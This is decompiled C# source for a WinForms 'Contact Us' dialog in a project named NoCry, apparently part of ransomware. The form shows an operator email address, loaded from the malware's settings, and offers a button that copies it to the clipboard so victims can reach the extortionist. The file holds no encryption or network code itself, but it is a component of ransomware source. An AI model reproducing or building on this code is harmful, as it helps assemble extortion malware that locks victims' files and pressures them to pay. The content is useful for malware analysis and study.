using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace NoCry;

[DesignerGenerated]
public class Form3 : Form
{
	private IContainer components;

	internal virtual GroupBox GroupBox1
	{
		[CompilerGenerated]
		get
		{
			return _GroupBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = GroupBox1_Enter;
			GroupBox groupBox = _GroupBox1;
			if (groupBox != null)
			{
				((Control)groupBox).remove_Enter(eventHandler);
			}
			_GroupBox1 = value;
			groupBox = _GroupBox1;
			if (groupBox != null)
			{
				((Control)groupBox).add_Enter(eventHandler);
			}
		}
	}

	internal virtual Label Label2
	{
		[CompilerGenerated]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Label2_Click;
			Label label = _Label2;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label2 = value;
			label = _Label2;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label1
	{
		[CompilerGenerated]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Label1_Click;
			Label label = _Label1;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label1 = value;
			label = _Label1;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button1_Click;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	public Form3()
	{
		((Form)this).add_Load((EventHandler)Form3_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Expected O, but got Unknown
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_0188: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0208: Expected O, but got Unknown
		//IL_0236: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ac: Expected O, but got Unknown
		//IL_02d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_038e: Unknown result type (might be due to invalid IL or missing references)
		GroupBox1 = new GroupBox();
		Button1 = new Button();
		Label2 = new Label();
		Label1 = new Label();
		((Control)GroupBox1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)GroupBox1).get_Controls().Add((Control)(object)Button1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label2);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label1);
		((Control)GroupBox1).set_Font(new Font("Tahoma", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)GroupBox1).set_ForeColor(Color.White);
		((Control)GroupBox1).set_Location(new Point(16, 15));
		((Control)GroupBox1).set_Margin(new Padding(4, 4, 4, 4));
		((Control)GroupBox1).set_Name("GroupBox1");
		((Control)GroupBox1).set_Padding(new Padding(4, 4, 4, 4));
		((Control)GroupBox1).set_Size(new Size(468, 123));
		((Control)GroupBox1).set_TabIndex(0);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("Contact Me On My Email");
		((ButtonBase)Button1).set_BackColor(Color.White);
		((Control)Button1).set_Cursor(Cursors.get_Hand());
		((Control)Button1).set_ForeColor(Color.Black);
		((Control)Button1).set_Location(new Point(343, 84));
		((Control)Button1).set_Margin(new Padding(4, 4, 4, 4));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(117, 32));
		((Control)Button1).set_TabIndex(12);
		((ButtonBase)Button1).set_Text("Copy");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(false);
		Label2.set_AutoSize(true);
		((Control)Label2).set_Font(new Font("Tahoma", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(Color.White);
		((Control)Label2).set_Location(new Point(77, 52));
		((Control)Label2).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(177, 17));
		((Control)Label2).set_TabIndex(6);
		Label2.set_Text("ssh-services@proton.me");
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Tahoma", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.White);
		((Control)Label1).set_Location(new Point(8, 50));
		((Control)Label1).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(58, 18));
		((Control)Label1).set_TabIndex(5);
		Label1.set_Text("Email :");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		((Form)this).set_BackColor(Color.Maroon);
		((Form)this).set_ClientSize(new Size(500, 151));
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).set_ForeColor(Color.White);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_Margin(new Padding(4, 4, 4, 4));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form3");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Contact Us");
		((Control)GroupBox1).ResumeLayout(false);
		((Control)GroupBox1).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Clipboard.SetText(Label2.get_Text());
			MessageBox.Show("Copied To Clipboard");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Form3_Load(object sender, EventArgs e)
	{
		Label2.set_Text(Class1.Settings.email);
	}

	private void GroupBox1_Enter(object sender, EventArgs e)
	{
	}

	private void Label1_Click(object sender, EventArgs e)
	{
	}

	private void Label2_Click(object sender, EventArgs e)
	{
	}
}
